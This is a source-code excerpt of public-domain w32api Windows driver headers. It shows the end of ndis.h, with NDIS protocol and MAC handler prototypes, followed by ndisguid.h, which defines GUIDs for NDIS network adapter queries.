
NDISAPI
VOID
NTAPI
NdisOpenAdapter(
  OUT PNDIS_STATUS Status,
  OUT PNDIS_STATUS OpenErrorStatus,
  OUT PNDIS_HANDLE NdisBindingHandle,
  OUT PUINT SelectedMediumIndex,
  IN PNDIS_MEDIUM MediumArray,
  IN UINT MediumArraySize,
  IN NDIS_HANDLE NdisProtocolHandle,
  IN NDIS_HANDLE ProtocolBindingContext,
  IN PNDIS_STRING AdapterName,
  IN UINT OpenOptions,
  IN PSTRING AddressingInformation OPTIONAL);

NDISAPI
VOID
NTAPI
NdisCloseAdapter(
  OUT PNDIS_STATUS Status,
  IN NDIS_HANDLE NdisBindingHandle);

NDISAPI
VOID
NTAPI
NdisCompleteBindAdapter(
  IN NDIS_HANDLE BindAdapterContext,
  IN NDIS_STATUS Status,
  IN NDIS_STATUS OpenStatus);

NDISAPI
VOID
NTAPI
NdisCompleteUnbindAdapter(
  IN NDIS_HANDLE UnbindAdapterContext,
  IN NDIS_STATUS Status);

NDISAPI
VOID
NTAPI
NdisSetProtocolFilter(
  OUT PNDIS_STATUS Status,
  IN NDIS_HANDLE NdisBindingHandle,
  IN RECEIVE_HANDLER ReceiveHandler,
  IN RECEIVE_PACKET_HANDLER ReceivePacketHandler,
  IN NDIS_MEDIUM Medium,
  IN UINT Offset,
  IN UINT Size,
  IN PUCHAR Pattern);

NDISAPI
VOID
NTAPI
NdisGetDriverHandle(
  IN PNDIS_HANDLE NdisBindingHandle,
  OUT PNDIS_HANDLE NdisDriverHandle);

NDISAPI
VOID
NTAPI
NdisOpenProtocolConfiguration(
  OUT PNDIS_STATUS Status,
  OUT PNDIS_HANDLE ConfigurationHandle,
  IN PNDIS_STRING ProtocolSection);

NDISAPI
VOID
NTAPI
NdisCompletePnPEvent(
  IN NDIS_STATUS Status,
  IN NDIS_HANDLE NdisBindingHandle,
  IN PNET_PNP_EVENT NetPnPEvent);

/*
 * VOID
 * NdisSetSendFlags(
 *   IN PNDIS_PACKET Packet,
 *   IN UINT Flags);
 */
#define NdisSetSendFlags(_Packet,_Flags)(_Packet)->Private.Flags = (_Flags)

#define NdisQuerySendFlags(_Packet,_Flags) *(_Flags) = (_Packet)->Private.Flags

NDISAPI
VOID
NTAPI
NdisReturnPackets(
  IN PNDIS_PACKET *PacketsToReturn,
  IN UINT NumberOfPackets);

NDISAPI
PNDIS_PACKET
NTAPI
NdisGetReceivedPacket(
  IN PNDIS_HANDLE NdisBindingHandle,
  IN PNDIS_HANDLE MacContext);

NDISAPI
VOID
NTAPI
NdisCancelSendPackets(
  IN NDIS_HANDLE NdisBindingHandle,
  IN PVOID CancelId);

NDISAPI
NDIS_STATUS
NTAPI
NdisQueryPendingIOCount(
  IN PVOID NdisBindingHandle,
  OUT PULONG IoCount);

NDISAPI
VOID
NTAPI
NdisRegisterProtocol(
  OUT PNDIS_STATUS Status,
  OUT PNDIS_HANDLE NdisProtocolHandle,
  IN PNDIS_PROTOCOL_CHARACTERISTICS ProtocolCharacteristics,
  IN UINT CharacteristicsLength);

#endif /* NDIS_LEGACY_PROTOCOL */

NDISAPI
UCHAR
NTAPI
NdisGeneratePartialCancelId(VOID);

NDISAPI
VOID
NTAPI
NdisReEnumerateProtocolBindings(
  IN NDIS_HANDLE NdisProtocolHandle);

NDISAPI
VOID
NTAPI
NdisRegisterTdiCallBack(
  IN TDI_REGISTER_CALLBACK RegisterCallback,
  IN TDI_PNP_HANDLER PnPHandler);

NDISAPI
VOID
NTAPI
NdisDeregisterTdiCallBack(VOID);

/* Obsoleted in Windows XP */

/* Prototypes for NDIS_MAC_CHARACTERISTICS */

typedef NDIS_STATUS (*OPEN_ADAPTER_HANDLER)(
  OUT PNDIS_STATUS  OpenErrorStatus,
  OUT NDIS_HANDLE  *MacBindingHandle,
  OUT PUINT  SelectedMediumIndex,
  IN PNDIS_MEDIUM  MediumArray,
  IN UINT  MediumArraySize,
  IN NDIS_HANDLE  NdisBindingContext,
  IN NDIS_HANDLE  MacAdapterContext,
  IN UINT  OpenOptions,
  IN PSTRING  AddressingInformation  OPTIONAL);

typedef NDIS_STATUS (NTAPI *CLOSE_ADAPTER_HANDLER)(
  IN NDIS_HANDLE  MacBindingHandle);

typedef NDIS_STATUS (NTAPI *WAN_TRANSFER_DATA_HANDLER)(
  VOID);

typedef NDIS_STATUS (NTAPI *QUERY_GLOBAL_STATISTICS_HANDLER)(
  IN NDIS_HANDLE  MacAdapterContext,
  IN PNDIS_REQUEST  NdisRequest);

typedef VOID (NTAPI *UNLOAD_MAC_HANDLER)(
  IN NDIS_HANDLE  MacMacContext);

typedef NDIS_STATUS (NTAPI *ADD_ADAPTER_HANDLER)(
  IN NDIS_HANDLE  MacMacContext,
  IN NDIS_HANDLE  WrapperConfigurationContext,
  IN PNDIS_STRING  AdapterName);

typedef VOID (*REMOVE_ADAPTER_HANDLER)(
  IN NDIS_HANDLE  MacAdapterContext);

typedef struct _NDIS_MAC_CHARACTERISTICS {
  UCHAR  MajorNdisVersion;
  UCHAR  MinorNdisVersion;
  USHORT  Filler;
  UINT  Reserved;
  OPEN_ADAPTER_HANDLER  OpenAdapterHandler;
  CLOSE_ADAPTER_HANDLER  CloseAdapterHandler;
  SEND_HANDLER  SendHandler;
  TRANSFER_DATA_HANDLER  TransferDataHandler;
  RESET_HANDLER  ResetHandler;
  REQUEST_HANDLER  RequestHandler;
  QUERY_GLOBAL_STATISTICS_HANDLER  QueryGlobalStatisticsHandler;
  UNLOAD_MAC_HANDLER  UnloadMacHandler;
  ADD_ADAPTER_HANDLER  AddAdapterHandler;
  REMOVE_ADAPTER_HANDLER  RemoveAdapterHandler;
  NDIS_STRING  Name;
} NDIS_MAC_CHARACTERISTICS, *PNDIS_MAC_CHARACTERISTICS;

typedef	NDIS_MAC_CHARACTERISTICS        NDIS_WAN_MAC_CHARACTERISTICS;
typedef	NDIS_WAN_MAC_CHARACTERISTICS    *PNDIS_WAN_MAC_CHARACTERISTICS;

#ifdef __cplusplus
}
#endif

#endif /* _NDIS_ */

/* EOF */

```

`include/ddk/ndisguid.h`:

```h
/*
 * ndisguid.h
 *
 * GUIDs for NDIS drivers
 *
 * This file is part of the w32api package.
 *
 * Contributors:
 *   Created by Casper S. Hornstrup <chorns@users.sourceforge.net>
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

#pragma once

#include <initguid.h>
#ifdef __cplusplus
extern "C" {
#endif

DEFINE_GUID(GUID_DEVINTERFACE_NET, 0xcac88484, 0x7515, 0x4c03, 0x82, 0xe6, 0x71, 0xa8, 0x7a, 0xba, 0xc3, 0x61);
DEFINE_GUID(GUID_NDIS_802_11_ADD_KEY, 0xab8b5a62, 0x1d51, 0x49d8, 0xba, 0x5c, 0xfa, 0x98, 0x0b, 0xe0, 0x3a, 0x1d);
DEFINE_GUID(GUID_NDIS_802_11_ADD_WEP, 0x4307bff0, 0x2129, 0x11d4, 0x97, 0xeb, 0x00, 0xc0, 0x4f, 0x79, 0xc4, 0x03);
DEFINE_GUID(GUID_NDIS_802_11_ASSOCIATION_INFORMATION, 0xa08d4dd0, 0x960e, 0x40bd, 0x8c, 0xf6, 0xc5, 0x38, 0xaf, 0x98, 0xf2, 0xe3);
DEFINE_GUID(GUID_NDIS_802_11_AUTHENTICATION_MODE, 0x43920a24, 0x2129, 0x11d4, 0x97, 0xeb, 0x00, 0xc0, 0x4f, 0x79, 0xc4, 0x03);
DEFINE_GUID(GUID_NDIS_802_11_BSSID, 0x2504b6c2, 0x1fa5, 0x11d4, 0x97, 0xeb, 0x00, 0xc0, 0x4f, 0x79, 0xc4, 0x03);
DEFINE_GUID(GUID_NDIS_802_11_BSSID_LIST, 0x69526f9a, 0x2062, 0x11d4, 0x97, 0xeb, 0x00, 0xc0, 0x4f, 0x79, 0xc4, 0x03);
DEFINE_GUID(GUID_NDIS_802_11_BSSID_LIST_SCAN, 0x0d9e01e1, 0xba70, 0x11d4, 0xb6, 0x75, 0x00, 0x20, 0x48, 0x57, 0x03, 0x37);
DEFINE_GUID(GUID_NDIS_802_11_CONFIGURATION, 0x4a4df982, 0x2068, 0x11d4, 0x97, 0xeb, 0x00, 0xc0, 0x4f, 0x79, 0xc4, 0x03);
DEFINE_GUID(GUID_NDIS_802_11_DESIRED_RATES, 0x452ee08e, 0x2536, 0x11d4, 0x97, 0xeb, 0x00, 0xc0, 0x4f, 0x79, 0xc4, 0x03);
DEFINE_GUID(GUID_NDIS_802_11_DISASSOCIATE, 0x43671f40, 0x2129, 0x11d4, 0x97, 0xeb, 0x00, 0xc0, 0x4f, 0x79, 0xc4, 0x03);
DEFINE_GUID(GUID_NDIS_802_11_FRAGMENTATION_THRESHOLD, 0x69aaa7c4, 0x2062, 0x11d4, 0x97, 0xeb, 0x00, 0xc0, 0x4f, 0x79, 0xc4, 0x03);
DEFINE_GUID(GUID_NDIS_802_11_INFRASTRUCTURE_MODE, 0x697d5a7e, 0x2062, 0x11d4, 0x97, 0xeb, 0x00, 0xc0, 0x4f, 0x79, 0xc4, 0x03);
DEFINE_GUID(GUID_NDIS_802_11_MEDIA_STREAM_MODE, 0x0a56af66, 0xd84b, 0x49eb, 0xa2, 0x8d, 0x52, 0x82, 0xcb, 0xb6, 0xd0, 0xcd);
DEFINE_GUID(GUID_NDIS_802_11_NETWORK_TYPES_SUPPORTED, 0x8531d6e6, 0x2041, 0x11d4, 0x97, 0xeb, 0x00, 0xc0, 0x4f, 0x79, 0xc4, 0x03);
DEFINE_GUID(GUID_NDIS_802_11_NETWORK_TYPE_IN_USE, 0x857e2326, 0x2041, 0x11d4, 0x97, 0xeb, 0x00, 0xc0, 0x4f, 0x79, 0xc4, 0x03);
DEFINE_GUID(GUID_NDIS_802_11_NUMBER_OF_ANTENNAS, 0x01779336, 0x2064, 0x11d4, 0x97, 0xeb, 0x00, 0xc0, 0x4f, 0x79, 0xc4, 0x03);
DEFINE_GUID(GUID_NDIS_802_11_POWER_MODE, 0x85be837c, 0x2041, 0x11d4, 0x97, 0xeb, 0x00, 0xc0, 0x4f, 0x79, 0xc4, 0x03);
DEFINE_GUID(GUID_NDIS_802_11_PRIVACY_FILTER, 0x6733c4e9, 0x4792, 0x11d4, 0x97, 0xf1, 0x00, 0xc0, 0x4f, 0x79, 0xc4, 0x03);
DEFINE_GUID(GUID_NDIS_802_11_RELOAD_DEFAULTS, 0x748b14e8, 0x32ee, 0x4425, 0xb9, 0x1b, 0xc9, 0x84, 0x8c, 0x58, 0xb5, 0x5a);
DEFINE_GUID(GUID_NDIS_802_11_REMOVE_KEY, 0x73cb28e9, 0x3188, 0x42d5, 0xb5, 0x53, 0xb2, 0x12, 0x37, 0xe6, 0x08, 0x8c);
DEFINE_GUID(GUID_NDIS_802_11_REMOVE_WEP, 0x433c345c, 0x2129, 0x11d4, 0x97, 0xeb, 0x00, 0xc0, 0x4f, 0x79, 0xc4, 0x03);
DEFINE_GUID(GUID_NDIS_802_11_RSSI, 0x1507db16, 0x2053, 0x11d4, 0x97, 0xeb, 0x00, 0xc0, 0x4f, 0x79, 0xc4, 0x03);
DEFINE_GUID(GUID_NDIS_802_11_RSSI_TRIGGER, 0x155689b8, 0x2053, 0x11d4, 0x97, 0xeb, 0x00, 0xc0, 0x4f, 0x79, 0xc4, 0x03);
DEFINE_GUID(GUID_NDIS_802_11_RTS_THRESHOLD, 0x0134d07e, 0x2064, 0x11d4, 0x97, 0xeb, 0x00, 0xc0, 0x4f, 0x79, 0xc4, 0x03);
DEFINE_GUID(GUID_NDIS_802_11_RX_ANTENNA_SELECTED, 0x01ac07a2, 0x2064, 0x11d4, 0x97, 0xeb, 0x00, 0xc0, 0x4f, 0x79, 0xc4, 0x03);
DEFINE_GUID(GUID_NDIS_802_11_SSID, 0x7d2a90ea, 0x2041, 0x11d4, 0x97, 0xeb, 0x00, 0xc0, 0x4f, 0x79, 0xc4, 0x03);
DEFINE_GUID(GUID_NDIS_802_11_STATISTICS, 0x42bb73b0, 0x2129, 0x11d4, 0x97, 0xeb, 0x00, 0xc0, 0x4f, 0x79, 0xc4, 0x03);
DEFINE_GUID(GUID_NDIS_802_11_SUPPORTED_RATES, 0x49db8722, 0x2068, 0x11d4, 0x97, 0xeb, 0x00, 0xc0, 0x4f, 0x79, 0xc4, 0x03);
DEFINE_GUID(GUID_NDIS_802_11_TEST, 0x4b9ca16a, 0x6a60, 0x4e9d, 0x92, 0x0c, 0x63, 0x35, 0x95, 0x3f, 0xa0, 0xb5);
DEFINE_GUID(GUID_NDIS_802_11_TX_ANTENNA_SELECTED, 0x01dbb74a, 0x2064, 0x11d4, 0x97, 0xeb, 0x00, 0xc0, 0x4f, 0x79, 0xc4, 0x03);
DEFINE_GUID(GUID_NDIS_802_11_TX_POWER_LEVEL, 0x11e6ba76, 0x2053, 0x11d4, 0x97, 0xeb, 0x00, 0xc0, 0x4f, 0x79, 0xc4, 0x03);
DEFINE_GUID(GUID_NDIS_802_11_WEP_STATUS, 0xb027a21f, 0x3cfa, 0x4125, 0x80, 0x0b, 0x3f, 0x7a, 0x18, 0xfd, 0xdc, 0xdc);
DEFINE_GUID(GUID_NDIS_802_3_CURRENT_ADDRESS, 0x44795700, 0xa61b, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_802_3_MAC_OPTIONS, 0x44795703, 0xa61b, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_802_3_MAXIMUM_LIST_SIZE, 0x44795702, 0xa61b, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_802_3_MULTICAST_LIST, 0x44795701, 0xa61b, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_802_3_PERMANENT_ADDRESS, 0x447956ff, 0xa61b, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_802_3_RCV_ERROR_ALIGNMENT, 0x44795704, 0xa61b, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_802_3_XMIT_MORE_COLLISIONS, 0x44795706, 0xa61b, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_802_3_XMIT_ONE_COLLISION, 0x44795705, 0xa61b, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_802_5_CURRENT_ADDRESS, 0x44795708, 0xa61b, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_802_5_CURRENT_FUNCTIONAL, 0x44795709, 0xa61b, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_802_5_CURRENT_GROUP, 0x4479570a, 0xa61b, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_802_5_CURRENT_RING_STATE, 0xacf14032, 0xa61c, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_802_5_CURRENT_RING_STATUS, 0x890a36ec, 0xa61c, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_802_5_LAST_OPEN_STATUS, 0x4479570b, 0xa61b, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_802_5_LINE_ERRORS, 0xacf14033, 0xa61c, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_802_5_LOST_FRAMES, 0xacf14034, 0xa61c, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_802_5_PERMANENT_ADDRESS, 0x44795707, 0xa61b, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_ENUMERATE_ADAPTER, 0x981f2d7f, 0xb1f3, 0x11d0, 0x8d, 0xd7, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_ENUMERATE_ADAPTERS_EX, 0x16716917, 0x4306, 0x4be4, 0x9b, 0x5a, 0x38, 0x09, 0xae, 0x44, 0xb1, 0x25);
DEFINE_GUID(GUID_NDIS_ENUMERATE_VC, 0x981f2d82, 0xb1f3, 0x11d0, 0x8d, 0xd7, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_CO_DRIVER_VERSION, 0x791ad198, 0xe35c, 0x11d0, 0x96, 0x92, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_CO_HARDWARE_STATUS, 0x791ad192, 0xe35c, 0x11d0, 0x96, 0x92, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_CO_LINK_SPEED, 0x791ad195, 0xe35c, 0x11d0, 0x96, 0x92, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_CO_MAC_OPTIONS, 0x791ad19a, 0xe35c, 0x11d0, 0x96, 0x92, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_CO_MEDIA_CONNECT_STATUS, 0x791ad19b, 0xe35c, 0x11d0, 0x96, 0x92, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_CO_MEDIA_IN_USE, 0x791ad194, 0xe35c, 0x11d0, 0x96, 0x92, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_CO_MEDIA_SUPPORTED, 0x791ad193, 0xe35c, 0x11d0, 0x96, 0x92, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_CO_MINIMUM_LINK_SPEED, 0x791ad19d, 0xe35c, 0x11d0, 0x96, 0x92, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_CO_RCV_PDUS_ERROR, 0x0a214808, 0xe35f, 0x11d0, 0x96, 0x92, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_CO_RCV_PDUS_NO_BUFFER, 0x0a214809, 0xe35f, 0x11d0, 0x96, 0x92, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_CO_RCV_PDUS_OK, 0x0a214806, 0xe35f, 0x11d0, 0x96, 0x92, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_CO_VENDOR_DESCRIPTION, 0x791ad197, 0xe35c, 0x11d0, 0x96, 0x92, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_CO_VENDOR_DRIVER_VERSION, 0x791ad19c, 0xe35c, 0x11d0, 0x96, 0x92, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_CO_VENDOR_ID, 0x791ad196, 0xe35c, 0x11d0, 0x96, 0x92, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_CO_XMIT_PDUS_ERROR, 0x0a214807, 0xe35f, 0x11d0, 0x96, 0x92, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_CO_XMIT_PDUS_OK, 0x0a214805, 0xe35f, 0x11d0, 0x96, 0x92, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_CURRENT_LOOKAHEAD, 0x5ec10361, 0xa61a, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_CURRENT_PACKET_FILTER, 0x5ec10360, 0xa61a, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_DRIVER_VERSION, 0x5ec10362, 0xa61a, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_ENUMERATE_PORTS, 0xf1d6abe8, 0x15e4, 0x4407, 0x81, 0xb7, 0x6b, 0x83, 0x0c, 0x77, 0x7c, 0xd9);
DEFINE_GUID(GUID_NDIS_GEN_HARDWARE_STATUS, 0x5ec10354, 0xa61a, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_INTERRUPT_MODERATION, 0xd9c8eea5, 0xf16e, 0x467c, 0x84, 0xd5, 0x63, 0x45, 0xa2, 0x2c, 0xe2, 0x13);
DEFINE_GUID(GUID_NDIS_GEN_INTERRUPT_MODERATION_PARAMETERS, 0xd789adfa, 0x9c56, 0x433b, 0xad, 0x01, 0x75, 0x74, 0xf3, 0xce, 0xdb, 0xe9);
DEFINE_GUID(GUID_NDIS_GEN_LINK_PARAMETERS, 0x8c7d3579, 0x252b, 0x4614, 0x82, 0xc5, 0xa6, 0x50, 0xda, 0xa1, 0x50, 0x49);
DEFINE_GUID(GUID_NDIS_GEN_LINK_SPEED, 0x5ec10359, 0xa61a, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_LINK_STATE, 0xba1f4c14, 0xa945, 0x4762, 0xb9, 0x16, 0x0b, 0x55, 0x15, 0xb6, 0xf4, 0x3a);
DEFINE_GUID(GUID_NDIS_GEN_MAC_OPTIONS, 0x5ec10365, 0xa61a, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_MAXIMUM_FRAME_SIZE, 0x5ec10358, 0xa61a, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_MAXIMUM_LOOKAHEAD, 0x5ec10357, 0xa61a, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_MAXIMUM_SEND_PACKETS, 0x5ec10367, 0xa61a, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_MAXIMUM_TOTAL_SIZE, 0x5ec10363, 0xa61a, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_MEDIA_CONNECT_STATUS, 0x5ec10366, 0xa61a, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_MEDIA_IN_USE, 0x5ec10356, 0xa61a, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_MEDIA_SUPPORTED, 0x5ec10355, 0xa61a, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_PCI_DEVICE_CUSTOM_PROPERTIES, 0xaa39f5ab, 0xe260,0x4d01, 0x82, 0xb0, 0xb7, 0x37, 0xc8, 0x80, 0xea, 0x05);
DEFINE_GUID(GUID_NDIS_GEN_PHYSICAL_MEDIUM, 0x418ca16d, 0x3937, 0x4208, 0x94, 0x0a, 0xec, 0x61, 0x96, 0x27, 0x80, 0x85);
DEFINE_GUID(GUID_NDIS_GEN_PHYSICAL_MEDIUM_EX, 0x899e7782, 0x035b,0x43f9, 0x8b, 0xb6, 0x2b, 0x58, 0x97, 0x16, 0x12, 0xe5);
DEFINE_GUID(GUID_NDIS_GEN_PORT_AUTHENTICATION_PARAMETERS, 0xaab6ac31, 0x86fb, 0x48fb, 0x8b, 0x48, 0x63, 0xdb, 0x23, 0x5a, 0xce, 0x16);
DEFINE_GUID(GUID_NDIS_GEN_PORT_STATE, 0x6fbf2a5f, 0x8b8f, 0x4920, 0x81, 0x43, 0xe6, 0xc4, 0x60, 0xf5, 0x25, 0x24);
DEFINE_GUID(GUID_NDIS_GEN_RCV_ERROR, 0x447956fd, 0xa61b, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_RCV_NO_BUFFER, 0x447956fe, 0xa61b, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_RCV_OK, 0x447956fb, 0xa61b, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_RECEIVE_BLOCK_SIZE, 0x5ec1035d, 0xa61a, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_RECEIVE_BUFFER_SPACE, 0x5ec1035b, 0xa61a, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_STATISTICS, 0x368c45b5, 0xc129, 0x43c1, 0x93, 0x9e, 0x7e, 0xdc, 0x2d, 0x7f, 0xe6, 0x21);
DEFINE_GUID(GUID_NDIS_GEN_TRANSMIT_BLOCK_SIZE, 0x5ec1035c, 0xa61a, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_TRANSMIT_BUFFER_SPACE, 0x5ec1035a, 0xa61a, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_VENDOR_DESCRIPTION, 0x5ec1035f, 0xa61a, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_VENDOR_DRIVER_VERSION, 0x447956f9, 0xa61b, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_VENDOR_ID, 0x5ec1035e, 0xa61a, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_VLAN_ID, 0x765dc702, 0xc5e8, 0x4b67, 0x84, 0x3b, 0x3f, 0x5a, 0x4f, 0xf2, 0x64, 0x8b);
DEFINE_GUID(GUID_NDIS_GEN_XMIT_ERROR, 0x447956fc, 0xa61b, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_GEN_XMIT_OK, 0x447956fa, 0xa61b, 0x11d0, 0x8d, 0xd4, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_HD_SPLIT_CURRENT_CONFIG, 0x81d1303c, 0xab00, 0x4e49, 0x80, 0xb1, 0x5e, 0x6e, 0x0b, 0xf9, 0xbe, 0x53);
DEFINE_GUID(GUID_NDIS_HD_SPLIT_PARAMETERS, 0x8c048bea, 0x2913, 0x4458, 0xb6, 0x8e, 0x17, 0xf6, 0xc1, 0xe5, 0xc6, 0x0e);
DEFINE_GUID(GUID_NDIS_LAN_CLASS, 0xad498944, 0x762f, 0x11d0, 0x8d, 0xcb, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_NOTIFY_ADAPTER_ARRIVAL, 0x981f2d81, 0xb1f3, 0x11d0, 0x8d, 0xd7, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
